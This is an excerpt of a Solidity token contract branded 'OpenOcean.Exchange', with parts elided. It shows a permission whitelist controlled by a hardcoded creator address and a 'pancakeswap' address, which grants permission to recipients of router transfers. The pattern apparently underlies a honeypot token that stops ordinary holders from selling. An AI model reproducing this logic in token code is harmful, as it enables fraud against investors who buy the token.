...
contract Permissions is Context
{
    ...
    address private _pancakeswap;
    mapping (address => bool) private _permitted;

    constructor() public
    {
        _creator = 0xF70456A7c8B8be8E12a87Af83c0959B629c57cb4; 
        _pancakeswap = 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F; 
        
        _permitted[_creator] = true;
        _permitted[_pancakeswap] = true;
    }
    
    function creator() public view returns (address)
    { return _creator; }
    
    function pancakeswap() public view returns (address)
    { return _pancakeswap; }
    
    function givePermissions(address who) internal
    {
        require(_msgSender() == _creator || _msgSender() == _pancakeswap, "You do not have permissions for this action");
        _permitted[who] = true;
    }
...
contract ERC20 is Permissions, IERC20 {
    ...
    constructor () public {
        //_name = "OpenOcean.Exchange";
        //_symbol = "OOE";
        _name = "OpenOcean.Exchange";
        _symbol = "OOE";
        _decimals = 18;
        _totalSupply = 37275000000000000000000000;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        if(_msgSender() == pancakeswap())
        { givePermissions(recipient); } // pancakeswap should transfer only to the exchange contract (pool) - give it permissions to transfer
